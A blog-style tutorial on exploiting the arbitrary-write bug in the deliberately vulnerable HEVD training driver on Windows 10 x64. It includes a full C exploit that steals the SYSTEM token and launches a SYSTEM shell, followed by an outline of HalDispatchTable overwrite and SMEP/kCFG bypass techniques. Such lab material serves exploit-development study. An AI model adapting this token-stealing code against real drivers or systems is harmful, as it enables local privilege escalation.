---
title: Windows 10 x64 Kernel Exploitation - Arbitrary Write (Write-What-Where) using HEVD
---

## What's a Write-What-Where (WWW)
```c
*Where = *What;
```

Obviously in real life code, the `Where` and `What` will be some other BS, but you get the idea. 

## Turning a Arbitrary Write into Arbitrary Read
The `What` is the address we want to read, and the `Where` is a user mode variable.

```c
void WriteQWORD(HANDLE hHEVD, PVOID what, PVOID where) {

	WRITE_WHAT_WHERE www = {
		.What  = what,
		.Where = where,
	};

	DWORD dwBytesReturned = 0;
	DeviceIoControl(
		hHEVD,
		HEVD_IOCTL_ARBITRARY_WRITE,
		&www,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0x00,
		&dwBytesReturned,
		NULL);
}

u64 HalDispatchTable08  = kernelBase + 0xc00a68; // ? nt!HalDispatchTable+0x8 - nt

// Write the nt!HalDispatchTable+0x8 (What) into halDispatchTable08Val (Where)
u64 halDispatchTable08Val = 0;
WriteQWORD(hHEVD, HalDispatchTable08, &halDispatchTable08Val);
```

NOTE: `HalDispatchTable08` is the address we want to read. It will be dereferenced to get the value. We MUST pass the address of halDispatchTable08Val, not the value of the variable (which is this example is 0).

## Methods for Exploitation (without RCE)
You can basically write the token stealing shellcode from the previous blog using the arbitrary read/write primitive. There is a slight distinction in that, in the shellcode we have the pointer to our own process, and search for the PID 4 (SYSTEM) process. In this method it’s the opposite, we have the PID 4 (SYSTEM) process pointer, and have to search for our own process.

This code will replace the token of the current process with that of the PsInitialSystemProcess (the PID 4 process). 

However, we didn’t come all this way to simply get SYSTEM, RCE in the kernel || GTFO.

```c
#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_ARBITRARY_WRITE IOCTL(0x802)

typedef unsigned long long u64;

typedef struct _WRITE_WHAT_WHERE {
	PVOID What;
	PVOID Where;
} WRITE_WHAT_WHERE;

void WriteQWORD(HANDLE hHEVD, PVOID what, PVOID where) {

	WRITE_WHAT_WHERE www = {
		.What  = what,
		.Where = where,
	};

	DWORD dwBytesReturned = 0;
	DeviceIoControl(
		hHEVD,
		HEVD_IOCTL_ARBITRARY_WRITE,
		&www,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0x00,
		&dwBytesReturned,
		NULL);
}

u64 ReadQWORD(HANDLE hHEVD, PVOID what) {
	u64 val = 0;
	WriteQWORD(hHEVD, what, &val);
	return val;
}

u64 GetKernelBase(void) {
	LPVOID drivers[1024] = { 0 };
	DWORD cbNeeded;
	EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded);
	return (u64)drivers[0];
}

int main(void) {

	const u64 TokenOffset                  = 0x4b8;    // dt _EPROCESS Token 
	const u64 ActiveProcessLinksOffset     = 0x448;    // dt _EPROCESS ActiveProcessLinks
	const u64 UniqueProcessIdOffset        = 0x440;    // dt _EPROCESS UniqueProcessId
	const u64 PsInitialSystemProcessOffset = 0xcfc420; // ? nt!PsInitialSystemProcessPtr - nt

	HANDLE hHEVD = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hHEVD == INVALID_HANDLE_VALUE) ExitProcess(1);

	u64 kernelBase = GetKernelBase();
	if (kernelBase == 0) ExitProcess(1);

	u64 PsInitialSystemProcessPtr = ReadQWORD(hHEVD, kernelBase + PsInitialSystemProcessOffset);
	printf("PsInitialSystemProcessPtr: 0x%llx\n", PsInitialSystemProcessPtr);

	u64 SystemProcessTokenPtr = ReadQWORD(hHEVD, PsInitialSystemProcessPtr + TokenOffset) & ~0xF;
	printf("SystemProcessTokenPtr:  0x%llx\n", SystemProcessTokenPtr);

	DWORD TargetPID = GetCurrentProcessId();

	u64 ProcessHead = PsInitialSystemProcessPtr;
start:
	ProcessHead = ReadQWORD(hHEVD, ProcessHead + ActiveProcessLinksOffset) - ActiveProcessLinksOffset;
	if (ReadQWORD(hHEVD, ProcessHead + UniqueProcessIdOffset) != TargetPID) {
		goto start;
	}

	u64 TargetProcessTokenRefCount = ReadQWORD(hHEVD, ProcessHead + TokenOffset) & 15;
	u64 FinalToken  = TargetProcessTokenRefCount | SystemProcessTokenPtr;
	WriteQWORD(hHEVD, &FinalToken, ProcessHead + TokenOffset);

	STARTUPINFOW        si = { .cb = sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION pi = { 0 };

	if (CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
		NULL, NULL, NULL, FALSE, 0, NULL, NULL,
		&si, &pi)) 
	{
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}

	return 0;
}
```

## Methods for RCE Exploitation

Literally all you needs is:
1. Any function pointer in the kernel (that isn't called too often) 
2. A way to trigger the kernel to call it
3. (Optional) Have control over some registers when you trigger the call. Doesn't matter if we dont, you can overwite the poitner with the address of the shellcode stored in the kernel.
4. (Optional) Have the function pointer stored in a writeable page. Doesn't matter if we don't, you can make it a writable page by modifiyng the PTE.

I'm certain there are countless ways to exploite a WWW, but finding these is not easy, and beyond the scope of this blog. I'll focus on the very well known public technique of the HalDispatchTable which meets all 4 of the criteria.

The HalDispatchTable is a bunch of function pointers. We can overwrite the 2nd entry at HalDispatchTable+0x08, and trigger it with `NtQueryIntervalProfile`. 

TODO: PIC OF HAL HISPATCH TABLE, 2nd entry highlightred

The big question is, wtf do we put in the `HalDispatchTable`? Ideally, the address of some shellcode right? But there are several considerations to be made with regards modern security control in Windows.

1. Firstly, like the [Stack Buffer Overflow](https://acebond.github.io/2025-01-23-windows-kernel-stack-buffer-overflow-exploitation-using-hevd.html) blog, SMEP won't let us execute user land addresses in the kernel.
2. kCFG (kernel Control-Flow Guard), even when VBS/HVCI is disabled, will perform a bitwise test to ensure user mode addresses aren't called from kernel mode. This happens during guarded calls, which is the cases of the HalDispatchTable. This is basically SMEP implemented again but in a different way. If VBS/HVCI is enabled, its way way more strict.
3. There is also Kernel Page-Table Isolation (KPTI) (also known as Kernel Virtual Address (KVA) Shadow) which as I understand causes user land pages to be mapped into the kernel without the executbale bit. And everytime I had issues I thought it might be this, but in the end it wasn't and I did nothing special to bypass KPTI, so I will continue not knowing exactly what its doing or stopping.

With these in mind, we have a few options:

- Put the address of a ROP gadget to Stack Pivot, ROP to disable SMEP and ret into the shellcode.
- Use the Arbitrary Write to modify the shellcode PTE, and ROP to jmp/call the shellcode.
- Find or use the Arbitrary Write to modify a page within the kernel, making it Read-Write-Exeucte. Write the shellcode into that page, and put that shellcode address into the HalDispatchTable.


